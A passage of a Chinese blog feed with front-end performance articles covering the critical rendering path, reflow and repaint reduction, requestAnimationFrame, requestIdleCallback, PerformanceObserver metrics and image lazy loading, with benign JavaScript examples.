    <content type="html"><![CDATA[<p>浏览器接收到服务器返回的 <code>HTML</code>、<code>CSS</code> 和 <code>JavaScript</code> 字节数据并对其进行解析和转变成像素的渲染过程被称为关键渲染路径。通过优化关键渲染路径即可以缩短浏览器渲染页面的时间。</p><p>浏览器渲染页面前需要先构建 <code>DOM</code> 和 <code>CSSOM</code> 树。因此，我们需要确保尽快将 <code>HTML</code> 和 <code>CSS</code> 都提供给浏览器。</p><a id="more"></a><h2 id="文档对象模型-DOM"><a href="#文档对象模型-DOM" class="headerlink" title="文档对象模型 (DOM)"></a>文档对象模型 (DOM)</h2><p>先看一下浏览器是如何构建 <code>DOM</code> 的：</p><p><img src="/assets/img/dom-full-process.png" alt="dom full process"></p><ol><li>转换： 浏览器从磁盘或网络读取 <code>HTML</code> 的原始字节，并根据文件的指定编码（例如 <code>UTF-8</code>）将它们转换成各个字符。</li><li>令牌化： 浏览器将字符串转换成 <code>W3C HTML5</code> 标准规定的各种令牌，例如，<code>&lt;html&gt;</code>、<code>&lt;body&gt;</code>，以及其他尖括号内的字符串。每个令牌都具有特殊含义和一组规则。</li><li>词法分析： 发出的令牌转换成定义其属性和规则的“对象”。</li><li><code>DOM</code> 构建： 最后，由于 <code>HTML</code> 标记定义不同标记之间的关系（一些标记包含在其他标记内），创建的对象链接在一个树数据结构内，此结构也会捕获原始标记中定义的父项-子项关系：<code>HTML</code> 对象是 <code>body</code> 对象的父项，<code>body</code> 是 <code>paragraph</code> 对象的父项，依此类推。</li></ol><h2 id="CSS-对象模型-CSSOM"><a href="#CSS-对象模型-CSSOM" class="headerlink" title="CSS 对象模型 (CSSOM)"></a>CSS 对象模型 (CSSOM)</h2><p>与处理 <code>HTML</code> 时一样，我们需要将收到的 <code>CSS</code> 规则转换成某种浏览器能够理解和处理的东西。因此，我们会重复 <code>HTML</code> 过程，不过是为 <code>CSS</code> 而不是 <code>HTML</code>：</p><p><img src="/assets/img/cssom-construction.png" alt="cssom construction"></p><p>这就是构建 <code>CSSOM</code> 树的过程。</p><h2 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h2><p>我们根据 <code>HTML</code> 和 <code>CSS</code> 输入构建了 <code>DOM</code> 树和 <code>CSSOM</code> 树。不过，它们都是独立的对象，分别网罗文档不同方面的信息：一个描述内容，另一个则是描述需要对文档应用的样式规则。需要将二者结合生成渲染树才是渲染到屏幕上的东西。</p><p><img src="/assets/img/render-tree-construction.png" alt="render tree construction"></p><p>为构建渲染树，浏览器大体上完成了下列工作：</p><p>1.从 <code>DOM</code> 树的根节点开始遍历每个可见节点。</p><ul><li>某些节点不可见（例如脚本标记、元标记等），因为它们不会体现在渲染输出中，所以会被忽略。</li><li>某些节点通过 <code>CSS</code> 隐藏，因此在渲染树中也会被忽略，例如，上例中的 <code>span</code> 节点—不会出现在渲染树中，—因为有一个显式规则在该节点上设置了 <code>display: none</code> 属性。(值得注意的是<code>visibility: hidden</code> 属性并不算是不可见属性，它的语义是隐藏元素，但元素仍然占据着布局空间，所以它会被渲染成一个空框)</li></ul><p>2.对于每个可见节点，为其找到适配的 <code>CSSOM</code> 规则并应用它们。</p><p>3.发射可见节点，连同其内容和计算的样式。</p><p>渲染树构建完毕后，浏览器得到了每个可见节点的内容与其样式，下一步工作则需要计算每个节点在窗口内的确切位置与大小，也就是 <strong>布局阶段</strong>。</p><p>布局阶段会从渲染树的根节点开始遍历，然后确定每个节点对象在页面上的确切大小与位置，布局阶段的输出是一个盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小，所有相对的测量值也都会被转换为屏幕内的绝对像素值。</p><h2 id="关键渲染路径"><a href="#关键渲染路径" class="headerlink" title="关键渲染路径"></a>关键渲染路径</h2><p>1.处理 HTML 标记并构建 DOM 树。</p><p>2.处理 CSS 标记并构建 CSSOM 树。</p><p>3.将 DOM 与 CSSOM 合并成一个渲染树。</p><p>4.根据渲染树来布局，以计算每个节点的几何信息。</p><p>5.将各个节点绘制到屏幕上。</p><p><strong>优化关键渲染路径_就是指最大限度缩短执行上述第 1 步至第 5 步耗费的总时间</strong></p><h2 id="阻塞渲染的-CSS"><a href="#阻塞渲染的-CSS" class="headerlink" title="阻塞渲染的 CSS"></a>阻塞渲染的 CSS</h2><p><code>CSS</code> 是阻塞渲染的资源。需要将它尽早、尽快地下载到客户端，以便缩短首次渲染的时间。</p><p>通过使用媒体查询，我们可以根据特定用例（比如显示或打印），也可以根据动态情况（比如屏幕方向变化、尺寸调整事件等）定制外观。<strong>声明样式表资产时，请密切注意媒体类型和查询，因为它们将严重影响关键渲染路径的性能</strong>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"style.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"print.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">media</span>=<span class="string">"print"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"other.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">media</span>=<span class="string">"(min-width: 40em)"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>像上面的第一个适用所有情况，故而会阻塞渲染；而第二个和第三个分别适应打印时和屏幕宽度大于 <code>40em</code> 时，所以不会阻塞渲染。</p><blockquote><p>请注意“阻塞渲染”仅是指浏览器是否需要暂停网页的首次渲染，直至该资源准备就绪。无论哪一种情况，浏览器仍会下载 <code>CSS</code> 资源，只不过不阻塞渲染的资源优先级较低罢了。</p></blockquote><h2 id="优化-JavaScript"><a href="#优化-JavaScript" class="headerlink" title="优化 JavaScript"></a>优化 JavaScript</h2><ul><li><code>JavaScript</code> 可以查询和修改 <code>DOM</code> 与 <code>CSSOM</code>。</li><li><code>JavaScript</code> 执行会阻止 <code>CSSOM</code>。</li><li>除非将 <code>JavaScript</code> 显式声明为异步，否则它会阻止构建 <code>DOM</code>。</li></ul><p>可以将脚本标记为异步防止阻塞 <code>DOM</code> 和 <code>CSSOM</code> 构建：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app.js"</span> <span class="attr">async</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="优化关键渲染路径总结"><a href="#优化关键渲染路径总结" class="headerlink" title="优化关键渲染路径总结"></a>优化关键渲染路径总结</h2><ul><li><p>关键资源：可能阻塞网页首次渲染的资源。</p></li><li><p>关键路径长度：获取关键资源所需的往返次数或总时间。</p></li><li><p>关键字节：所有关键资源文件大小的总和。</p></li></ul><p>优化关键渲染路径就是在对关键资源、关键路径长度和关键字节进行优化。关键资源越少，浏览器在渲染前的准备工作就越少；同样，关键路径长度和关键字节关系到浏览器下载资源的效率，它们越少，浏览器下载资源的速度就越快。</p><blockquote><p>评估关键渲染路径可以使用 <code>Lighthouse</code> 审核页面，参阅 <a href="https://developers.google.cn/web/tools/lighthouse/?hl=zh-cn" target="_blank" rel="noopener">使用 Lighthouse 审核网络应用</a>。</p></blockquote><h2 id="PageSpeed-规则和建议"><a href="#PageSpeed-规则和建议" class="headerlink" title="PageSpeed 规则和建议"></a>PageSpeed 规则和建议</h2><ul><li><p>优化 <code>JavaScript</code> 的使用<br>避免同步服务器调用<br>延迟解析 <code>JavaScript</code>，<code>async</code> 和 <code>defer</code><br>避免运行时间长的 <code>JavaScript</code></p></li><li><p>优化 CSS 的使用<br>将 <code>CSS</code> 置于文档 <code>head</code> 标签内，尽早下载<br>避免使用 <code>CSS import</code>，它们会在关键路径中增加往返次数<br>内联阻塞渲染的 <code>CSS</code>，这样不会增加关键路径中增加往返次数</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;浏览器接收到服务器返回的 &lt;code&gt;HTML&lt;/code&gt;、&lt;code&gt;CSS&lt;/code&gt; 和 &lt;code&gt;JavaScript&lt;/code&gt; 字节数据并对其进行解析和转变成像素的渲染过程被称为关键渲染路径。通过优化关键渲染路径即可以缩短浏览器渲染页面的时间。&lt;/p&gt;
&lt;p&gt;浏览器渲染页面前需要先构建 &lt;code&gt;DOM&lt;/code&gt; 和 &lt;code&gt;CSSOM&lt;/code&gt; 树。因此，我们需要确保尽快将 &lt;code&gt;HTML&lt;/code&gt; 和 &lt;code&gt;CSS&lt;/code&gt; 都提供给浏览器。&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="性能优化" scheme="http://1016990109.github.io/tags/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之浏览器性能优化</title>
    <link href="http://1016990109.github.io/2018/08/02/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
    <id>http://1016990109.github.io/2018/08/02/前端基础之浏览器性能优化/</id>
    <published>2018-08-02T15:43:25.000Z</published>
    <updated>2018-09-17T01:59:15.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渲染性能"><a href="#渲染性能" class="headerlink" title="渲染性能"></a>渲染性能</h1><h2 id="重绘重排"><a href="#重绘重排" class="headerlink" title="重绘重排"></a>重绘重排</h2><p>以下三种情况会导致网页重新渲染：</p><ul><li>修改 DOM</li><li>修改样式表</li><li>用户事件（比如鼠标悬停、页面滚动、输入框键入文字、改变窗口大小等等）</li></ul><a id="more"></a><p>需要注意的是，”重绘”不一定需要”重排”，比如改变某个网页元素的颜色，就只会触发”重绘”，不会触发”重排”，因为布局没有改变。但是，”重排”必然导致”重绘”，比如改变一个网页元素的位置，就会同时触发”重排”和”重绘”，因为布局改变了。像重绘一般很难避免，所以这里不讨论。</p><h3 id="减少重排方案"><a href="#减少重排方案" class="headerlink" title="减少重排方案"></a>减少重排方案</h3><p>1.分离读写操作<br><code>DOM</code> 的多个读操作（或多个写操作），应该放在一起。不要两个读操作之间，加入一个写操作。</p><p>2.如果某个样式是通过重排得到的，那么最好缓存结果。避免下一次用到的时候，浏览器又要重排。</p><p>3.不要一条条地改变样式，而要通过改变 <code>class</code>，或者 <code>csstext</code> 属性，一次性地改变样式。</p><p>4.尽量使用离线 <code>DOM</code>，而不是真实的网面 <code>DOM</code>，来改变元素样式。比如，操作 <code>Document Fragment</code> 对象，完成后再把这个对象加入 <code>DOM</code>。再比如，使用 <code>cloneNode()</code> 方法，在克隆的节点上进行操作，然后再用克隆的节点替换原始节点。</p><p>5.先将元素设为 <code>display: none</code>（需要 1 次重排和重绘），然后对这个节点进行 100 次操作，最后再恢复显示（需要 1 次重排和重绘）。这样一来，你就用两次重新渲染，取代了可能高达 100 次的重新渲染。</p><p>6.<code>position</code> 属性为 <code>absolute</code> 或 <code>fixed</code> 的元素，重排的开销会比较小，因为不用考虑它对其他元素的影响。原理就是使得元素不再同一层，<strong>基于这种想法还可以使用 <code>transform:translateZ(0);</code> 或者 <code>will-change:transform</code> 来创建新层</strong>，同样能减少重排，一般是对有动画的元素，因为重排很会频繁。</p><p>7.只在必要的时候，才将元素的 <code>display</code> 属性为可见，因为不可见的元素不影响重排和重绘。另外，<code>visibility : hidden</code> 的元素只对重绘有影响，不影响重排。先把元素设置为 <code>display:none</code> 最后再 <code>display:block</code> 就只会触发两次次重绘重排，一次消失，一次出现。</p><p>8.使用 <code>createDocumentFragment</code> 来创建 <code>DocumentFragment</code>(不属于文档树)，把需要插入的节点放到其中，最后再把 <code>DocumentFragment</code> 插入到文档流。当请求把一个 <code>DocumentFragment</code> 节点插入文档树时，插入的不是 <code>DocumentFragment</code> 自身，而是它的所有子孙节点。这使得 <code>DocumentFragment</code> 成了有用的占位符，暂时存放那些一次插入文档的节点。它还有利于实现文档的剪切、复制和粘贴操作。</p><p>9.使用 <code>cloneNode(true or false)</code> 和 <code>replaceChild</code> 技术，引发一次回流和重绘；</p><p>10.使用虚拟 <code>DOM</code> 的脚本库，比如 <code>React</code> 等。</p><p>11.使用 <code>window.requestAnimationFrame()</code>、<code>window.requestIdleCallback()</code> 这两个方法调节重新渲染（详见后文）。</p><h2 id="刷新率"><a href="#刷新率" class="headerlink" title="刷新率"></a>刷新率</h2><p>网页动画的每一帧（<code>frame</code>）都是一次重新渲染。每秒低于 24 帧的动画，人眼就能感受到停顿。一般的网页动画，需要达到每秒 30 帧到 60 帧的频率，才能比较流畅。如果能达到每秒 70 帧甚至 80 帧，就会极其流畅。</p><p>如果想达到 60 帧的刷新率，就意味着 <code>JavaScript</code> 线程每个任务的耗时，必须少于 16 毫秒。一个解决办法是使用 <code>Web Worker</code>，主线程只用于 <code>UI</code> 渲染，然后跟 <code>UI</code> 渲染不相干的任务，都放在 <code>Worker</code> 线程。</p><h3 id="开发者工具-Timeline"><a href="#开发者工具-Timeline" class="headerlink" title="开发者工具 Timeline"></a>开发者工具 Timeline</h3><p><code>Chrome</code> 或 <code>Safari</code> 之类的浏览器在开发者模式下有个 <code>Timeline</code> 的选项卡，可以录制一段时间内浏览器性能的问题，有帧模式和事件模式，可以互相切换。横条的是”事件模式”（<code>Event Mode</code>），显示重新渲染的各种事件所耗费的时间；竖条的是”帧模式”（<code>Frame Mode</code>），显示每一帧的时间耗费在哪里。</p><p>帧模式有两条水平线，下面的一条是 <code>60FPS</code>，低于这条线，可以达到每秒 60 帧；上面的一条是 <code>30FPS</code>，低于这条线，可以达到每秒 30 次渲染。如果色柱都超过 <code>30FPS</code>，这个网页就有性能问题了。</p><h2 id="PerformanceObserver"><a href="#PerformanceObserver" class="headerlink" title="PerformanceObserver"></a>PerformanceObserver</h2><p>这是个性能监测的 <code>API</code>，可以观察不同性能类型。</p><p><code>Google</code> 提出了以用户为中心的四个衡量指标：</p><ol><li>Is it happening? First Paint (<code>FP</code>,首次渲染,背景颜色之类的) / First Contentful Paint (<code>FCP</code>,首次内容渲染,有 <code>DOM</code> 出现)</li><li>Is it useful? First Meaningful Paint (<code>FMP</code>,首次有意义渲染) / Hero Element Timing</li><li>Is it usable? Time to Interactive (<code>TTI</code>,可以交互时间)</li><li>Is it delightful? Long Tasks(长任务)</li></ol><p><img src="/assets/img/perf-metrics-load-timeline.png" alt="perf-metrics-load-timeline"></p><ul><li><p>跟踪 <code>FP/FCP</code>，监听 <code>paint</code> 事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> observer = <span class="keyword">new</span> PerformanceObserver(<span class="function"><span class="params">list</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> entry <span class="keyword">of</span> list.getEntries()) &#123;</span><br><span class="line">    <span class="comment">// `name` will be either 'first-paint' or 'first-contentful-paint'.</span></span><br><span class="line">    <span class="keyword">const</span> metricName = entry.name</span><br><span class="line">    <span class="keyword">const</span> time = <span class="built_in">Math</span>.round(entry.startTime + entry.duration)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//发送到 Google Analytics</span></span><br><span class="line">    ga(<span class="string">'send'</span>, <span class="string">'event'</span>, &#123;</span><br><span class="line">      eventCategory: <span class="string">'Performance Metrics'</span>,</span><br><span class="line">      eventAction: metricName,</span><br><span class="line">      eventValue: time,</span><br><span class="line">      nonInteraction: <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">observer.observe(&#123; <span class="attr">entryTypes</span>: [<span class="string">'paint'</span>] &#125;)</span><br></pre></td></tr></table></figure></li><li><p>同理监听 <code>longtask</code> 事件，可以发现阻塞主进程的长任务进而进行优化。</p></li><li><p><code>FMP</code><br>关于页面有效内容，或者“Hero element”，由于依赖具体实现，并没有给出通用方法。 具体可以使用 <a href="https://speedcurve.com/blog/user-timing-and-custom-metrics/" target="_blank" rel="noopener">performance api 度量指标</a>。</p></li><li><p><code>TTI</code><br>对于 <code>TTI</code> 可以使用 <a href="https://github.com/GoogleChromeLabs/tti-polyfill" target="_blank" rel="noopener">tti-polyfill</a> 的垫片来完成对 <code>TTI</code> 的监控：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ttiPolyfill <span class="keyword">from</span> <span class="string">'./path/to/tti-polyfill.js'</span></span><br><span class="line"></span><br><span class="line">ttiPolyfill.getFirstConsistentlyInteractive().then(<span class="function"><span class="params">tti</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//发送到 Google Analytics</span></span><br><span class="line">  ga(<span class="string">'send'</span>, <span class="string">'event'</span>, &#123;</span><br><span class="line">    eventCategory: <span class="string">'Performance Metrics'</span>,</span><br><span class="line">    eventAction: <span class="string">'TTI'</span>,</span><br><span class="line">    eventValue: tti,</span><br><span class="line">    nonInteraction: <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>input latency(输入延迟)<br>有时候鼠标事件可能会超过很长一段时间才响应，这也是需要我们发现并解决的，可以用当前时间与事件事件比较得出结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> subscribeBtn = <span class="built_in">document</span>.querySelector(<span class="string">'#subscribe'</span>);</span><br><span class="line"></span><br><span class="line">subscribeBtn.addEventListener(<span class="string">'click'</span>, (event) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Event listener logic goes here...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> lag = performance.now() - event.timeStamp;</span><br><span class="line">  <span class="keyword">if</span> (lag &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    ga(<span class="string">'send'</span>, <span class="string">'event'</span>, &#123;</span><br><span class="line">      eventCategory: <span class="string">'Performance Metric'</span></span><br><span class="line">      eventAction: <span class="string">'input-latency'</span>,</span><br><span class="line">      eventLabel: <span class="string">'#subscribe:click'</span>,</span><br><span class="line">      eventValue: <span class="built_in">Math</span>.round(lag),</span><br><span class="line">      nonInteraction: <span class="literal">true</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在某一个根元素上绑定对应监测事件，获得时间差，大于 100ms 则发送报告。</p></li></ul><h2 id="window-requestAnimationFrame"><a href="#window-requestAnimationFrame" class="headerlink" title="window.requestAnimationFrame"></a>window.requestAnimationFrame</h2><p><code>window.requestAnimationFrame(callback)</code> 方法可以将某些代码放到下一次重新渲染时执行。</p><p>页面滚动事件（<code>scroll</code>）的监听函数，就很适合用 <code>window.requestAnimationFrame()</code> ，推迟到下一次重新渲染。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">window</span>).on(<span class="string">'scroll'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame(scrollHandler)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>但是得注意一个问题，像滚动或者触屏事件可能频繁触发，导致在一帧内多次渲染，造成不必要的计算与绘制，解决方法一个是使用节流函数，另一个比较完美的方法就是通过 <code>requestAnimationFrame</code> 来管理队列，其思路就是保证 <code>requestAnimationFrame</code> 的队列里，同样的回调函数只有一个。示意代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> scheduledAnimationFrame = <span class="literal">false</span></span><br><span class="line"><span class="keyword">const</span> onScroll = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (scheduledAnimationFrame) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  scheduledAnimationFrame = <span class="literal">true</span></span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame(scrollHandler)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, onScroll)</span><br></pre></td></tr></table></figure><p>当然，最适用的场合还是网页动画。下面是一个旋转动画的例子，元素每一帧旋转 1 度。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rAF = <span class="built_in">window</span>.requestAnimationFrame</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> degrees = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  div.style.transform = <span class="string">'rotate('</span> + degrees + <span class="string">'deg)'</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'updated to degrees '</span> + degrees)</span><br><span class="line">  degrees = degrees + <span class="number">1</span></span><br><span class="line">  rAF(update)</span><br><span class="line">&#125;</span><br><span class="line">rAF(update)</span><br></pre></td></tr></table></figure><h2 id="window-requestIdleCallback"><a href="#window-requestIdleCallback" class="headerlink" title="window.requestIdleCallback()"></a>window.requestIdleCallback()</h2><p>另一个比较冷门的就是 <code>window.requestIdleCallback(callback [,timeout])</code> 了，这个函数指定只有当一帧的末尾有空闲时间，才会执行回调函数。也就是说只有当前帧的运行时间小于 16.66ms 时，函数 <code>callback</code> 才会执行。否则，就推迟到下一帧，如果下一帧也没有空闲时间，就推迟到下下一帧，以此类推。</p><p>第二个参数代表过了规定时间后如果还没出发就强制执行，怕浏览器一直很忙而来不及渲染。</p><p><code>callback</code> 可以接收 <code>deadline</code> 作为参数，<code>deadline</code> 对象有一个方法和一个属性：<code>timeRemaining()</code> 和 <code>didTimeout</code>。</p><p><code>timeRemaining()</code> 方法返回当前帧还剩余的毫秒。这个方法只能读，不能写，而且会动态更新。因此可以不断检查这个属性，如果还有剩余时间的话，就不断执行某些任务。一旦这个属性等于 0，就把任务分配到下一轮 <code>requestIdleCallback</code>。<code>didTimeout</code> 属性会返回一个布尔值，表示指定的时间是否过期。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myNonEssentialWork</span>(<span class="params">deadline</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//当前帧还有空余时间就做任务，如果任务没做完移动到下一个 requestIdleCallback</span></span><br><span class="line">  <span class="keyword">while</span> (</span><br><span class="line">    (deadline.timeRemaining() &gt; <span class="number">0</span> || deadline.didTimeout) &amp;&amp;</span><br><span class="line">    tasks.length &gt; <span class="number">0</span></span><br><span class="line">  )</span><br><span class="line">    doWorkIfNeeded()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tasks.length &gt; <span class="number">0</span>) requestIdleCallback(myNonEssentialWork)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requestIdleCallback(myNonEssentialWork, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>上面代码确保了，<code>doWorkIfNeeded</code> 函数一定会在将来某个比较空闲的时间（或者在指定时间过期后）得到反复执行。</p><h2 id="使输入处理程序去除抖动"><a href="#使输入处理程序去除抖动" class="headerlink" title="使输入处理程序去除抖动"></a>使输入处理程序去除抖动</h2><p>输入处理程序可能是应用出现性能问题的原因，因为它们可能阻止帧完成，并且可能导致额外（且不必要）的布局工作。</p><p>解决方案如下：</p><ul><li>避免长时间运行输入处理程序；它们可能阻止滚动。</li><li>不要在输入处理程序中进行样式更改。</li><li>使处理程序去除抖动；存储事件值并在下一个 <code>requestAnimationFrame</code> 回调中处理样式更改(<strong>注意更改样式放到最后，读取操作放在更改样式之前，以免发生强制同步布局</strong>)。</li></ul><p>去抖动：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onScroll</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Store the scroll value for laterz.</span></span><br><span class="line">  lastScrollY = <span class="built_in">window</span>.scrollY</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent multiple rAF callbacks.</span></span><br><span class="line">  <span class="keyword">if</span> (scheduledAnimationFrame) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  scheduledAnimationFrame = <span class="literal">true</span></span><br><span class="line">  requestAnimationFrame(readAndUpdatePage)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, onScroll)</span><br></pre></td></tr></table></figure><p>可以发现是先存储了 <code>window.scrollY</code>，然后在 <code>requestAnimationFram</code> 的回调函数中再去获取这个值，不用担心触发强制同步布局；使用 <code>scheduledAnimationFrame</code> 来防止抖动；这样做还有一个好处是使输入处理程序轻量化，效果非常好，因为现在您不用去阻止计算开销很大的代码的操作，处理逻辑都放到了 <code>requestAnimationFrame</code> 的回调函数中执行了！</p><h2 id="worker"><a href="#worker" class="headerlink" title="worker"></a>worker</h2><p>todo</p><h1 id="加载性能"><a href="#加载性能" class="headerlink" title="加载性能"></a>加载性能</h1><h2 id="压缩资源"><a href="#压缩资源" class="headerlink" title="压缩资源"></a>压缩资源</h2><ul><li><p>源码压缩：预处理和环境特定优化<br>压缩冗余或不必要数据的最佳方法是将其全部消除。我们不能只是删除任意数据，但在某些环境中，我们可能对数据格式及其属性有内容特定了解，往往可以在不影响其实际含义的情况下显著减小负载的大小。<br>比如消除 <code>CSS</code>, <code>JS</code>的注释，空格等等。</p></li><li><p>通过 <code>GZIP</code> 压缩文本<br><code>GZIP</code> 对基于文本的资产的压缩效果最好：<code>CSS</code>、<code>JavaScript</code> 和 <code>HTML</code>。<br>所有现代浏览器都支持 <code>GZIP</code> 压缩，并且会自动请求该压缩。<br>您的服务器必须配置为启用 <code>GZIP</code> 压缩。<br>某些 <code>CDN</code> 需要特别注意以确保 <code>GZIP</code> 已启用。</p></li></ul><h2 id="图像优化"><a href="#图像优化" class="headerlink" title="图像优化"></a>图像优化</h2><ul><li>消除多余的图像资源</li><li>尽可能利用 <code>CSS3</code> 效果，因为 <code>CSS3</code> 可能会启动 <code>GPU</code> 加速，这样就在单独的线程中去完成动画了，而不需要在主线程中，参考 <a href="https://developers.google.com/web/fundamentals/design-and-ux/animations/animations-and-performance?hl=zh-cn" target="_blank" rel="noopener">动画与性能</a></li><li>使用网页字体取代在图像中进行文本编码</li><li>使用矢量图(SVG)，还可以同时使用 <code>GZIP</code> 压缩</li><li>将图片格式转为 <code>WebP</code> 来压缩图片(有些浏览器不支持需要注意)</li><li>一些 <code>CDN</code> 也提供图片的优化</li><li>懒加载(将页面里所有 <code>img</code> 属性 <code>src</code> 属性用 <code>data-xx</code> 代替，当页面滚动直至此图片出现在可视区域时，用 <code>js</code> 取到该图片的 <code>data-xx</code> 的值赋给 <code>src</code>，<code>onscroll</code> 监听每一个 <code>li</code> 的 <code>scrollTop</code>，或者对于 <code>css</code> 属性的图片可以动态添加 <code>visible</code> 的 <code>class</code> 来完成，比如初始化的时候找一张 <code>holder</code> 的图片，等到滚动到可视区域后加上 <code>visible</code> 的 <code>class</code> 来替换成真实的图片)。这里可以了解一下 <code>IntersectionObserver API</code> 来检测对象是否在用户可视区。<strong>有时候为了节约渲染性能会使用和图片相同大小的占位符</strong></li><li>大的 